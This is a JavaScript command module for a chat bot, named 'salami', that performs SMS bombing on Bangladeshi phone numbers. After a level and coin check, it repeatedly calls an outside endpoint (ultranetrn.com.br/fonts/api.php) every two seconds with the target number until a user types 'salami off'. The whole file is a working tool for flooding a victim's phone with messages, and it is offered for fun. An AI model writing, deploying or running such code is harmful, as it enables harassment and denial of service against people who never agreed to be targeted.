const axios = require("axios");
const bombingFlags = {};
const deltaNext = 5;

function expToLevel(exp) {
  return Math.floor((1 + Math.sqrt(1 + 8 * exp / deltaNext)) / 2);
}

module.exports = {
  config: {
    name: "salami",
    version: "3.0",
    author: "Rahad",
    countDown: 0,
    role: 3,
    shortDescription: { en: "Send SMS bomb" },
    description: { en: "Starts SMS bombing on a number for fun (cost: 100 coins)" },
    category: "tools",
    guide: { en: "salami 01xxxxxxxxx\nsalami off" }
  },

  onStart: async function ({ event, message, args, usersData }) {
    const threadID = event.threadID;
    const senderID = event.senderID;
    const number = args[0];

    if (!number) {
      return message.reply("📱 Please provide a number or type 'off'\nExample: salami 01xxxxxxxxx");
    }

    const userData = await usersData.get(senderID);
    const exp = userData.exp || 0;
    const balance = userData.money || 0;
    const level = expToLevel(exp);

    // Level check
    if (level < 2) {
      return message.reply("🚫 You must be at least level 2 to use this command!");
    }

    // Stop bombing
    if (number.toLowerCase() === "off") {
      if (bombingFlags[threadID]) {
        bombingFlags[threadID] = false;
        return message.reply("✅ SMS bombing stopped.");
      } else {
        return message.reply("❗No active bombing in this thread.");
      }
    }

    // Validate number
    if (!/^01[0-9]{9}$/.test(number)) {
      return message.reply("📱 Please provide a valid Bangladeshi number!\n👉 Example: salami 01xxxxxxxxx\n💸 Each bombing costs 100 coins!");
    }

    // Already bombing
    if (bombingFlags[threadID]) {
      return message.reply("❗Bombing already in progress! To stop, type: salami off");
    }

    // Balance check
    if (balance < 100) {
      return message.reply(`❌ Not enough coins!\n🔻 Required: 100 coins\n🪙 Your balance: ${balance}`);
    }

    // Deduct 100 coins
    await usersData.set(senderID, { money: balance - 100 });

    message.reply(`💥 SMS bombing started on ${number}...\n💸 100 coins deducted!\n🛑 To stop: salami off`);

    bombingFlags[threadID] = true;

    // Start bombing with delay to prevent bot freeze
    (async function startBombing() {
      while (bombingFlags[threadID]) {
        try {
          await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
          await new Promise(resolve => setTimeout(resolve, 2000)); // 2 sec delay
        } catch (err) {
          message.reply(`❌ Error: ${err.message}`);
          bombingFlags[threadID] = false;
          break;
        }
      }
    })();
  }
};
